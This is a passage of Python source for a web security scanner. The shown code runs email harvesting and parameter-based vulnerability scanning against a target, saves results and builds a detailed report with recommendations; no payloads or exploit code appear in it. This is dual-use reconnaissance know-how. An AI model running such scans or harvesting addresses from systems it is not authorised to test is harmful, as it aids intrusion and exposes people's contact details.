            # Phase 6: Email Harvesting
            logger.info("\n[PHASE 6] Email Harvesting")
            
            # Collect URLs for email harvesting
            harvest_urls = [base_url]
            if self.results['reconnaissance'].get('files'):
                file_findings = self.results['reconnaissance']['files']['findings']
                for filename, info in file_findings.items():
                    if info.get('status_code') == 200:
                        harvest_urls.append(urljoin(base_url, filename))
            
            email_results = self.email_harvester.harvest_emails(harvest_urls)
            self.results['reconnaissance']['email_harvest'] = email_results
            
            if email_results.get('total_emails', 0) > 0:
                logger.info(f"Harvested {email_results['total_emails']} email addresses")
            else:
                logger.info("No email addresses found")

            # Phase 7: Vulnerability Scanning
            if not any([args.subdomains_only, args.dirs_files_only, args.web_analyze_only]):
                logger.info("\n[PHASE 7] Vulnerability Scanning")
                
                all_vulnerabilities = []
                
                # Test main URL if it has parameters
                parsed_url = urlparse(base_url)
                if parsed_url.query:
                    vulnerabilities = self.vuln_scanner.scan_url(base_url)
                    all_vulnerabilities.extend(vulnerabilities)
                
                # Test discovered files with common parameters
                discovered_files = self.results['reconnaissance'].get('files', {}).get('findings', {})
                for filename, file_info in discovered_files.items():
                    if file_info.get('status_code') == 200:
                        # Test with common parameters
                        file_url = urljoin(base_url, filename)
                        common_params = ['id', 'user', 'page', 'file', 'search', 'q', 'category', 'action']
                        
                        for param in common_params:
                            test_url = f"{file_url}?{param}=test"
                            file_vulns = self.vuln_scanner.scan_url(test_url, [param])
                            all_vulnerabilities.extend(file_vulns)
                
                # Test interesting paths from robots.txt
                robots_findings = self.results['reconnaissance'].get('robots_analysis', {}).get('interesting_findings', [])
                for finding in robots_findings:
                    test_url = urljoin(base_url, finding['path'])
                    try:
                        response = self.http_client.get(test_url)
                        if response.status_code == 200 and '?' in test_url:
                            robots_vulns = self.vuln_scanner.scan_url(test_url)
                            all_vulnerabilities.extend(robots_vulns)
                    except:
                        pass
                
                # Add security header vulnerabilities
                if security_analysis.get('vulnerabilities'):
                    all_vulnerabilities.extend(security_analysis['vulnerabilities'])
                
                # Add SSL vulnerabilities
                ssl_analysis = self.results['reconnaissance'].get('ssl_analysis', {})
                if ssl_analysis.get('vulnerabilities'):
                    all_vulnerabilities.extend(ssl_analysis['vulnerabilities'])
                
                self.results['vulnerabilities'] = all_vulnerabilities
                
                # Count vulnerabilities by severity
                critical_vulns = [v for v in all_vulnerabilities if v.get('severity') == 'Critical']
                high_vulns = [v for v in all_vulnerabilities if v.get('severity') == 'High']
                medium_vulns = [v for v in all_vulnerabilities if v.get('severity') == 'Medium']
                low_vulns = [v for v in all_vulnerabilities if v.get('severity') == 'Low']
                
                logger.info(f"Found {len(all_vulnerabilities)} total vulnerabilities")
                if critical_vulns:
                    logger.error(f"CRITICAL: {len(critical_vulns)} critical vulnerabilities found")
                if high_vulns:
                    logger.warning(f"HIGH: {len(high_vulns)} high-severity vulnerabilities found")
                if medium_vulns:
                    logger.info(f"MEDIUM: {len(medium_vulns)} medium-severity vulnerabilities found")
                if low_vulns:
                    logger.info(f"LOW: {len(low_vulns)} low-severity vulnerabilities found")

            # Calculate scan duration
            scan_duration = time.time() - scan_start_time
            self.results['scan_info']['scan_duration'] = round(scan_duration, 2)
            
            logger.info(f"\n[SCAN COMPLETED] Duration: {scan_duration:.2f} seconds")
            
        except Exception as e:
            logger.error(f"Error during scan: {e}")
            scan_duration = time.time() - scan_start_time
            self.results['scan_info']['scan_duration'] = round(scan_duration, 2)
            self.results['scan_info']['error'] = str(e)
        
        return self.results
    
    def save_results(self, output_file: str = None):
        """Save scan results to JSON file."""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_target_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', urlparse(self.target).netloc)
            output_file = f"newton_scan_{safe_target_name}_{timestamp}.json"
        
        try:
            # Convert sets to lists for JSON serialization
            def convert_sets(obj):
                if isinstance(obj, set):
                    return list(obj)
                elif isinstance(obj, dict):
                    return {k: convert_sets(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [convert_sets(item) for item in obj]
                return obj
            
            serializable_results = convert_sets(self.results)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(serializable_results, f, indent=2, ensure_ascii=False)
            logger.info(f"Results saved to {output_file}")
        except Exception as e:
            logger.error(f"Failed to save results: {e}")
    
    def generate_report(self) -> str:
        """Generate comprehensive security report."""
        report = []
        
        # Header
        report.append("=" * 80)
        report.append("NEWTON SECURITY SCANNER - COMPREHENSIVE REPORT")
        report.append("=" * 80)
        
        scan_info = self.results.get('scan_info', {})
        report.append(f"Target: {scan_info.get('target', 'Unknown')}")
        report.append(f"Scan Date: {scan_info.get('timestamp', 'Unknown')}")
        report.append(f"Scan Duration: {scan_info.get('scan_duration', 0)} seconds")
        report.append(f"Scanner Version: {scan_info.get('scanner_version', 'Unknown')}")
        
        # Executive Summary
        report.append("\n" + "=" * 80)
        report.append("EXECUTIVE SUMMARY")
        report.append("=" * 80)
        
        recon = self.results.get('reconnaissance', {})
        vulns = self.results.get('vulnerabilities', [])
        security = self.results.get('security_analysis', {})
        
        # Vulnerability counts
        critical_vulns = [v for v in vulns if v.get('severity') == 'Critical']
        high_vulns = [v for v in vulns if v.get('severity') == 'High']
        medium_vulns = [v for v in vulns if v.get('severity') == 'Medium']
        low_vulns = [v for v in vulns if v.get('severity') == 'Low']
        
        report.append(f"Total Vulnerabilities Found: {len(vulns)}")
        report.append(f"  - Critical: {len(critical_vulns)}")
        report.append(f"  - High: {len(high_vulns)}")
        report.append(f"  - Medium: {len(medium_vulns)}")
        report.append(f"  - Low: {len(low_vulns)}")
        
        report.append(f"\nReconnaissance Results:")
        report.append(f"  - Subdomains: {recon.get('subdomains', {}).get('count', 0)}")
        report.append(f"  - Directories: {recon.get('directories', {}).get('count', 0)}")
        report.append(f"  - Files: {recon.get('files', {}).get('count', 0)}")
        
        security_score = security.get('security_score', 0)
        max_score = security.get('max_score', 100)
        report.append(f"  - Security Score: {security_score}/{max_score} ({security_score/max_score*100:.1f}%)")
        
        # Technology Stack
        tech_stack = recon.get('technology_stack', {})
        if tech_stack:
            report.append("\n" + "=" * 80)
            report.append("TECHNOLOGY STACK ANALYSIS")
            report.append("=" * 80)
            
            # Response Analysis
            response_info = tech_stack.get('response_analysis', {})
            if response_info:
                report.append(f"Response Status: {response_info.get('status_code', 'Unknown')}")
                report.append(f"Response Time: {response_info.get('response_time_ms', 0)}ms")
                report.append(f"Content Length: {response_info.get('content_length', 0)} bytes")
                report.append(f"Content Type: {response_info.get('content_type', 'Unknown')}")
            
            # Server Information
            server_info = tech_stack.get('server_info', {})
            if server_info:
                report.append(f"\nServer Information:")
                report.append(f"  Web Server: {server_info.get('web_server', 'Unknown')}")
                report.append(f"  Version: {server_info.get('version', 'Unknown')}")
                report.append(f"  Operating System: {server_info.get('operating_system', 'Unknown')}")
                if server_info.get('additional_modules'):
                    report.append(f"  Additional Modules: {', '.join(server_info['additional_modules'])}")
            
            # Programming Languages
            if tech_stack.get('programming_languages'):
                report.append(f"\nProgramming Languages:")
                for lang in tech_stack['programming_languages']:
                    report.append(f"  - {lang}")
            
            # Web Frameworks
            if tech_stack.get('web_frameworks'):
                report.append(f"\nWeb Frameworks:")
                for framework in tech_stack['web_frameworks']:
                    report.append(f"  - {framework}")
            
            # CMS Information
            cms_info = tech_stack.get('cms_info', {})
            if cms_info.get('cms_name'):
                report.append(f"\nContent Management System:")
                report.append(f"  CMS: {cms_info['cms_name']}")
                if cms_info.get('version'):
                    report.append(f"  Version: {cms_info['version']}")
                if cms_info.get('themes'):
                    report.append(f"  Themes: {', '.join(cms_info['themes'])}")
                if cms_info.get('plugins'):
                    report.append(f"  Plugins: {', '.join(cms_info['plugins'][:10])}")  # Show first 10
                    if len(cms_info['plugins']) > 10:
                        report.append(f"    ... and {len(cms_info['plugins']) - 10} more")
            
            # JavaScript Libraries
            if tech_stack.get('javascript_libraries'):
                report.append(f"\nJavaScript Libraries:")
                for lib in tech_stack['javascript_libraries']:
                    report.append(f"  - {lib}")
            
            # Database Technologies
            if tech_stack.get('database_tech'):
                report.append(f"\nDatabase Technologies:")
                for db in tech_stack['database_tech']:
                    report.append(f"  - {db}")
            
            # CDN Services
            if tech_stack.get('cdn_services'):
                report.append(f"\nCDN Services:")
                for cdn in tech_stack['cdn_services']:
                    report.append(f"  - {cdn}")
            
            # Security Tools
            if tech_stack.get('security_tools'):
                report.append(f"\nSecurity Tools:")
                for tool in tech_stack['security_tools']:
                    report.append(f"  - {tool}")
            # Static Site Generator
            if tech_stack.get('static_site_generator'):
                report.append(f"\nStatic Site Generator:")
                report.append(f"  - {tech_stack['static_site_generator']}")
            # Error Pages
            if tech_stack.get('error_pages'):
                report.append(f"\nError Pages Detected:")
                for code, desc in tech_stack['error_pages'].items():
                    report.append(f"  {code}: {desc}")
        
        # Critical and High Severity Vulnerabilities
        if critical_vulns or high_vulns:
            report.append("\n" + "=" * 80)
            report.append("CRITICAL AND HIGH SEVERITY VULNERABILITIES")
            report.append("=" * 80)
            
            for vuln in critical_vulns + high_vulns:
                report.append(f"\n[{vuln.get('severity', 'Unknown').upper()}] {vuln.get('type', 'Unknown Vulnerability')}")
                if vuln.get('parameter'):
                    report.append(f"Parameter: {vuln['parameter']}")
                if vuln.get('url'):
                    report.append(f"URL: {vuln['url']}")
                if vuln.get('payload'):
                    report.append(f"Payload: {vuln['payload']}")
                if vuln.get('evidence'):
                    report.append(f"Evidence: {vuln['evidence']}")
                report.append("-" * 60)
        
        # Security Headers Analysis
        if security:
            report.append("\n" + "=" * 80)
            report.append("SECURITY HEADERS ANALYSIS")
            report.append("=" * 80)
            
            report.append(f"Security Score: {security_score}/{max_score} ({security_score/max_score*100:.1f}%)")
            
            if security.get('headers_found'):
                report.append(f"\nPresent Security Headers:")
                for header, value in security['headers_found'].items():
                    report.append(f"  {header}: {value}")
            
            if security.get('missing_headers'):
                report.append(f"\nMissing Security Headers:")
                for header in security['missing_headers']:
                    report.append(f"  - {header}")
            
            if security.get('recommendations'):
                report.append(f"\nRecommendations:")
                for rec in security['recommendations']:
                    report.append(f"  - {rec}")
        
        # Network Analysis
        port_scan = recon.get('port_scan', {})
        if port_scan.get('open_ports'):
            report.append("\n" + "=" * 80)
            report.append("NETWORK ANALYSIS")
            report.append("=" * 80)
            
            report.append(f"Open Ports Found: {len(port_scan['open_ports'])}/{port_scan.get('total_scanned', 0)}")
            for port_info in port_scan['open_ports']:
                report.append(f"  - Port {port_info['port']}: {port_info['service']} ({port_info['status']})")
        
        # SSL Analysis
        ssl_analysis = recon.get('ssl_analysis', {})
        if ssl_analysis.get('certificate_valid'):
            report.append(f"\nSSL Certificate Analysis:")
            report.append(f"  SSL Version: {ssl_analysis.get('ssl_version', 'Unknown')}")
            report.append(f"  Cipher Suite: {ssl_analysis.get('cipher_suite', 'Unknown')}")
            report.append(f"  Security Score: {ssl_analysis.get('security_score', 0)}/100")
            
            cert_details = ssl_analysis.get('certificate_details', {})
            if cert_details.get('subject'):
                report.append(f"  Certificate Subject: {cert_details['subject'].get('commonName', 'Unknown')}")
            if cert_details.get('issuer'):
                report.append(f"  Certificate Issuer: {cert_details['issuer'].get('organizationName', 'Unknown')}")
        
        # WAF Detection
        waf_detection = recon.get('waf_detection', {})
        if waf_detection.get('detected'):
            report.append(f"\nWAF Detection:")
            report.append(f"  WAF Type: {waf_detection.get('waf_name', 'Unknown')}")
            report.append(f"  Confidence: {waf_detection.get('confidence', 'low')}")
            report.append(f"  Detection Methods: {', '.join(waf_detection.get('detection_method', []))}")
        
        # Robots.txt Analysis
        robots_analysis = recon.get('robots_analysis', {})
        if robots_analysis.get('exists'):
            report.append(f"\nRobots.txt Analysis:")
            report.append(f"  Disallowed Paths: {len(robots_analysis.get('disallowed_paths', []))}")
            report.append(f"  Sitemaps Found: {len(robots_analysis.get('sitemaps', []))}")
            
            interesting_findings = robots_analysis.get('interesting_findings', [])
            if interesting_findings:
                report.append(f"  Interesting Findings: {len(interesting_findings)}")
                for finding in interesting_findings[:5]:
                    report.append(f"    - {finding['path']} ({finding['reason']})")
        
        # Email Harvesting
        email_harvest = recon.get('email_harvest', {})
        if email_harvest.get('total_emails', 0) > 0:
            report.append(f"\nEmail Harvesting:")
            report.append(f"  Total Emails: {email_harvest['total_emails']}")
            for email in email_harvest.get('emails', [])[:10]:  # Show first 10
                report.append(f"    - {email}")
            if len(email_harvest.get('emails', [])) > 10:
                report.append(f"    ... and {len(email_harvest['emails']) - 10} more")
        
        # Backup Files
        backup_files = recon.get('backup_files', [])
        if backup_files:
            report.append(f"\nBackup Files Found: {len(backup_files)}")
            for backup in backup_files[:10]:
                report.append(f"  - {backup['backup_file']} (Original: {backup['original_file']})")
            if len(backup_files) > 10:
                report.append(f"  ... and {len(backup_files) - 10} more")
        
        # Subdomain Enumeration Results
        subdomains_info = recon.get('subdomains', {})
        if subdomains_info.get('list'):
            report.append("\n" + "=" * 80)
            report.append("SUBDOMAIN ENUMERATION")
            report.append("=" * 80)
            
            report.append(f"Total Subdomains Found: {subdomains_info['count']}")
            report.append(f"\nSubdomains:")
            for subdomain in sorted(subdomains_info['list'])[:30]:  # Show first 30
                report.append(f"  - {subdomain}")
            if len(subdomains_info['list']) > 30:
                report.append(f"  ... and {len(subdomains_info['list']) - 30} more")
        
        # Directory and File Enumeration
        directories_info = recon.get('directories', {})
        files_info = recon.get('files', {})
        
        if directories_info.get('findings') or files_info.get('findings'):
            report.append("\n" + "=" * 80)
            report.append("DIRECTORY AND FILE ENUMERATION")
            report.append("=" * 80)
            
            if directories_info.get('findings'):
                report.append(f"Directories Found: {directories_info['count']}")
                for dirname, info in list(directories_info['findings'].items())[:20]:
                    status = info.get('status_code', 'Unknown')
                    size = info.get('content_length', 0)
                    listing = " [DIR_LISTING]" if info.get('directory_listing') else ""
                    report.append(f"  - /{dirname} (Status: {status}, Size: {size} bytes){listing}")
                if len(directories_info['findings']) > 20:
                    report.append(f"  ... and {len(directories_info['findings']) - 20} more")
            
            if files_info.get('findings'):
                report.append(f"\nFiles Found: {files_info['count']}")
                for filename, info in list(files_info['findings'].items())[:20]:
                    status = info.get('status_code', 'Unknown')
                    size = info.get('content_length', 0)
                    sensitive = " [SENSITIVE]" if info.get('has_sensitive_content') else ""
                    report.append(f"  - {filename} (Status: {status}, Size: {size} bytes){sensitive}")
                if len(files_info['findings']) > 20:
                    report.append(f"  ... and {len(files_info['findings']) - 20} more")
        
        # Medium and Low Severity Vulnerabilities
        if medium_vulns or low_vulns:
            report.append("\n" + "=" * 80)
            report.append("MEDIUM AND LOW SEVERITY VULNERABILITIES")
            report.append("=" * 80)
            
            for vuln in medium_vulns + low_vulns:
                report.append(f"\n[{vuln.get('severity', 'Unknown').upper()}] {vuln.get('type', 'Unknown Vulnerability')}")
                if vuln.get('parameter'):
                    report.append(f"Parameter: {vuln['parameter']}")
                if vuln.get('header'):
                    report.append(f"Header: {vuln['header']}")
                if vuln.get('recommendation'):
                    report.append(f"Recommendation: {vuln['recommendation']}")
                report.append("-" * 40)
        
        # Recommendations
        report.append("\n" + "=" * 80)
        report.append("SECURITY RECOMMENDATIONS")
        report.append("=" * 80)
        
        if critical_vulns:
            report.append("IMMEDIATE ACTION REQUIRED:")
            report.append("- Patch all critical vulnerabilities immediately")
            report.append("- Implement input validation and output encoding")
            report.append("- Review and secure all identified injection points")
        
        if high_vulns:
            report.append("\nHIGH PRIORITY:")
            report.append("- Address high-severity vulnerabilities within 24-48 hours")
            report.append("- Implement proper authentication and authorization")
            report.append("- Review file upload and inclusion mechanisms")
        
        # Network security recommendations
        if port_scan.get('open_ports'):
            report.append("\nNETWORK SECURITY:")
            report.append("- Review all open ports and close unnecessary services")
            report.append("- Implement firewall rules to restrict access")
            report.append("- Use VPN for administrative access")
        
        if ssl_analysis.get('vulnerabilities'):
            report.append("\nSSL/TLS SECURITY:")
            report.append("- Upgrade to latest TLS versions")
            report.append("- Configure strong cipher suites")
            report.append("- Implement certificate pinning")
        
        if waf_detection.get('detected'):
            report.append("\nWAF CONFIGURATION:")
            report.append("- Fine-tune WAF rules to reduce false positives")
            report.append("- Implement rate limiting")
            report.append("- Monitor WAF logs for attack patterns")
        
        report.append("\nGENERAL SECURITY IMPROVEMENTS:")
        report.append("- Implement all missing security headers")
        report.append("- Remove server version disclosure")
        report.append("- Set secure cookie attributes")
        report.append("- Implement proper error handling")
        report.append("- Regular security testing and code reviews")
        report.append("- Keep all software components updated")
        report.append("- Implement comprehensive logging and monitoring")
        report.append("- Conduct regular penetration testing")
        
        # Technical Summary
        report.append("\n" + "=" * 80)
        report.append("TECHNICAL SUMMARY")
        report.append("=" * 80)
        
        report.append(f"Scan completed in {scan_info.get('scan_duration', 0)} seconds")
        
        total_requests = (
            recon.get('directories', {}).get('count', 0) + 
            recon.get('files', {}).get('count', 0) + 
            len(recon.get('subdomains', {}).get('list', [])) +
            port_scan.get('total_scanned', 0)
        )
        report.append(f"Total requests/tests performed: ~{total_requests}")
        
        if tech_stack.get('response_analysis'):
            avg_response_time = tech_stack['response_analysis'].get('response_time_ms', 0)
            report.append(f"Average response time: {avg_response_time}ms")
        
        report.append(f"Vulnerability types identified: {len(set(v.get('type', '') for v in vulns))}")
        
        if email_harvest.get('total_emails', 0) > 0:
            report.append(f"Email addresses harvested: {email_harvest['total_emails']}")
        
        # Footer
        report.append("\n" + "=" * 80)
        report.append("END OF REPORT - NEWTON SECURITY SCANNER v2.0")
        report.append("Report generated for security assessment purposes")
        report.append("=" * 80)
        
        return "\n".join(report)

def setup_logging(log_file: str, verbose: bool):
    """Setup logging configuration."""
    for handler in logger.handlers[:]: 
        logger.removeHandler(handler)
        handler.close()
    
    file_handler = logging.FileHandler(log_file)
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(file_handler)

    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.DEBUG if verbose else logging.INFO)
    console_handler.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

    logger.setLevel(logging.DEBUG if verbose else logging.INFO)

def main():
    parser = argparse.ArgumentParser(
        description="Newton Security Scanner - Production Ready Web Application Security Testing Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("target_url", help="Target URL (e.g., https://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=25, help="Concurrent threads (default: 25)")
    parser.add_argument("-r", "--rate-limit", type=float, default=15, help="Requests per second (default: 15)")
    parser.add_argument("-p", "--proxies", nargs='+', help="HTTP/SOCKS proxies")
    parser.add_argument("-to", "--timeout", type=int, default=15, help="Request timeout (default: 15)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    parser.add_argument("-o", "--output", help="Output file for results")
    
    # Scan options
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--subdomains-only", action="store_true", help="Only subdomain enumeration")
    group.add_argument("--dirs-files-only", action="store_true", help="Only directory/file enumeration")
    group.add_argument("--web-analyze-only", action="store_true", help="Only web analysis")
    group.add_argument("--fuzz-only", action="store_true", help="Only vulnerability fuzzing")
    parser.add_argument("--skip-network", action="store_true", help="Skip network analysis (port scan, SSL)")

    args = parser.parse_args()

    setup_logging(LOG_FILE, args.verbose)
    
    print("=" * 80)
    print("NEWTON SECURITY SCANNER v2.0")
    print("Production Ready Web Application Security Testing Tool")
    print("=" * 80)
    print(f"Target: {args.target_url}")
    print(f"Threads: {args.threads}")
    print(f"Rate Limit: {args.rate_limit} req/sec")
    print(f"Timeout: {args.timeout}s")
    print("=" * 80)

    # Initialize scanner
    scanner = NewtonScanner(
        target=args.target_url,
        rate_limit=args.rate_limit,
        proxies=args.proxies,
        timeout=args.timeout
    )

    try:
        # Run scan
        logger.info("Starting comprehensive security scan...")
        final_results = scanner.run_comprehensive_scan(args)
        
        # Save results
        scanner.save_results(args.output)
        
        # Generate and display report
        report = scanner.generate_report()
        print("\n" + report)
        
        # Summary
        vulns = final_results.get('vulnerabilities', [])
        critical_count = len([v for v in vulns if v.get('severity') == 'Critical'])
        high_count = len([v for v in vulns if v.get('severity') == 'High'])
        
        print(f"\n{'='*80}")
        print("SCAN SUMMARY")
        print(f"{'='*80}")
        print(f"Total Vulnerabilities: {len(vulns)}")
        print(f"Critical: {critical_count}")
        print(f"High: {high_count}")
        print(f"Medium: {len([v for v in vulns if v.get('severity') == 'Medium'])}")
        print(f"Low: {len([v for v in vulns if v.get('severity') == 'Low'])}")
        
        if critical_count > 0:
            print(f"\nWARNING: {critical_count} critical vulnerabilities found - immediate action required!")
        elif high_count > 0:
            print(f"\nWARNING: {high_count} high-severity vulnerabilities found - address within 24-48 hours!")
        else:
            print(f"\nNo critical or high-severity vulnerabilities found in this scan.")
        
        print(f"Scan completed successfully in {final_results.get('scan_info', {}).get('scan_duration', 0)} seconds")
        
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
        scanner.save_results(args.output)
    except Exception as e:
        logger.error(f"Critical error during scan: {e}")
        scanner.save_results(args.output)
    
    logger.info("Scan process completed")

if __name__ == "__main__":
    main()